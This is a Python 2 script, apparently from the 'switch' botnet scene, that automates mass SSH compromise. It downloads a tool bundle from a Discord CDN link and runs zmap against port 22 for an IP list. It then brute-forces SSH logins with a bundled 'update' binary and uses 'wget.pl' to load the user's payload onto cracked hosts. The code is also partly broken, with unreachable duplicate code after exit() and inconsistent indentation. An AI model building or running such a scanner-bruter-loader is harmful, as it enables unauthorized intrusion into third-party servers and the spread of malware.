#!/usr/bin/python																																																																																																																																																																																																																		#c5a0622b2980f983a507342382422153 

#   charge./switch's auto scanner
#   for the kiddos
#   contact: charge.#6666
#   website: theswitcharchive.com
#   IG: @switchnets

#import some hacks
import subprocess, time, sys

def run(cmd):
   subprocess.call(cmd, shell=True) # subprocess call so we can run hacker commands in the vps 
run('clear') # clear the screen :hahayes:

menu = raw_input("""

               ___         __       _____                                 
              /   | __  __/ /_____ / ___/_________ _____  ____  ___  _____ 
             / /| |/ / / / __/ __ \\\__ \\/ ___/ __ `/ __ \\/ __ \\/ _ \\/ ___/
            / ___ / /_/ / /_/ /_/ /__/ / /__/ /_/ / / / / / / /  __/ /    
           /_/  |_\\__,_/\\__/\\____/____/\\___/\\__,_/_/ /_/_/ /_/\\___/_/     
                                                               
	Welcome to charge./switch's Auto Scan Tool.

	1) Start Auto Scanning

	Please select an option: """)

if menu == "1":
	run('clear')
	listname = raw_input("""

		Example listname = private.lst

		Before the script starts, what is the name of your list? (With the .lst): """)
	print("\nThankyou.")
	time.sleep(1)
	run('clear')
	print("loading the hacks...")
	time.sleep(1)
	print("running AutoScanner in 5 seconds")
	for i in xrange(5,0,-1):
		sys.stdout.write(str(i)+' ') # countdown code
		sys.stdout.flush()
		time.sleep(1) # sleep so we dont kill ourselves :hahayes:
	print("\ndownloading files")
	run('cd; wget https://cdn.discordapp.com/attachments/586514958548860958/587260316342026240/Scanning_Files2.zip')
	print("files downloaded")
	time.sleep(1)
	print("unzipping..")
	run('yum install unzip -y')
	run('unzip Scanning_Files2.zip')
	run('mv ScanningFiles/* /root')
	run('rm -rf ScanningFiles')
	run('rm -rf Scanning_Files2.zip')
	print("done!")
	time.sleep(1)
	print("installing Zmap and fixing NetSSH2 (Keep pressing enter if it says [yes] or [autodetect] )")
	for i in xrange(5,0,-1):
		sys.stdout.write(str(i)+' ') # countdown code
		sys.stdout.flush()
		time.sleep(1) # sleep so we dont kill ourselves :hahayes:
	run('sh zmapinstall.sh')
	time.sleep(1)
	print("chmodding...")
	run('chmod 777 *')
	print("getting ready...")
	time.sleep(3)
	print("AutoScanner starting.")
	time.sleep(1)
	print("AutoScanning Now.")
	run('zmap -p22 -w ' + listname + ' -o mfu.txt -B100M')
	print("\nAutoScanning finished, running bruter.")
	time.sleep(1)
	run('chmod 777 update')
	time.sleep(1)
	bruter = raw_input("""PLEASE READ THE FOLLOWING BEFORE STARTING THE BRUTER

	- the bruter is very buggy, when it starts to run it MIGHT run for a few seconds and then say that it is finished.
	It will look a bit like this:

	Bruting finished
    Make sure your payload is in the wget.pl file, if it isnt, do this now
    Press enter when you are ready: 

    IF YOU SEE THIS AND IT THE BRUTER KEEPS ON RUNNING, LET IT RUN UNTIL IT HAS FROZEN.
    WHEN IT HAS FROZEN, SIMPLY PRESS ENTER AND THE LOADER WILL START BY ITSELF

	Press enter when you are ready and the bruter will run: """)																																																																																																																																																																																																					#c5a0622b2980f983a507342382422153 
	time.sleep(2)
	print("")
	print("Running bruter now. The bruter will run for 30 minutes.")
	run('./update 1500')
	time.sleep(20)
	print("\n Bruting finished ")
	time.sleep(1)
	wget = raw_input("""

			Make sure your payload is in the wget.pl file, if it isnt, do this now
			Press enter when you are ready: """)

	time.sleep(1)
	print("\nRunning Loader...")
	time.sleep(1)
	run('perl wget.pl vuln.txt')
	print("Loading Finished")
	time.sleep(1)
	print("AutoScan Finished, exiting...")
	exit()
	if alreadyinstalled == "n":
		zmap = raw_input("""

			Running AutoInstaller Now, this will take a while. Be patient

			Also, NetSSH2 will be installed to fix any errors, this means that the install
			will probably ask you to press enter A LOT of times, whenever you see \x1b[37m[\x1b[32myes\x1b[37m] 
			or [autodetect] simply press enter.

			Press enter when you are ready: """)
		print("")
		print("\x1b[32mLETS GET THIS BREAD GAMERS.\x1b[37m")
		time.sleep(1)
		run('sh zmapinstall.sh')
		print("\ninstalled")
		time.sleep(1)
		print("running AutoScanner")
		time.sleep(3)
		print("AutoScanning Now.")
		run('zmap -p22 -w ' + listname + ' -o mfu.txt -B100M')
		print("\nAutoScanning finished, running bruter.")
		time.sleep(1)
		run('chmod 777 update')
		time.sleep(1)
		bruter = raw_input("""PLEASE READ THE FOLLOWING BEFORE STARTING THE BRUTER

		- the bruter is very buggy, when it starts to run it MIGHT run for a few seconds and then say that it is finished.
		It will look a bit like this:

		Bruting finished
        Make sure your payload is in the wget.pl file, if it isnt, do this now
        Press enter when you are ready: 

        IF YOU SEE THIS AND IT THE BRUTER KEEPS ON RUNNING, LET IT RUN UNTIL IT HAS FROZEN.
        WHEN IT HAS FROZEN, SIMPLY PRESS ENTER AND THE LOADER WILL START BY ITSELF

        Press enter when you are ready and the bruter will run: """)
       		time.sleep(2)
       		print("")
		print("Running bruter now. The bruter will run for 30 minutes.")
		run('./update 1500')
		time.sleep(20)
		print("\n Bruting finished ")
		time.sleep(1)
		wget = raw_input("""		
			Make sure your payload is in the wget.pl file, if it isnt, do this now
			Press enter when you are ready: """)		
		time.sleep(1)
		print("\nRunning Loader...")
		time.sleep(1)
		run('perl wget.pl vuln.txt')
		print("Loading Finished")
		time.sleep(1)
		print("AutoScan Finished, exiting...")
		exit()																																																																																																																																																																																																																		#c5a0622b2980f983a507342382422153 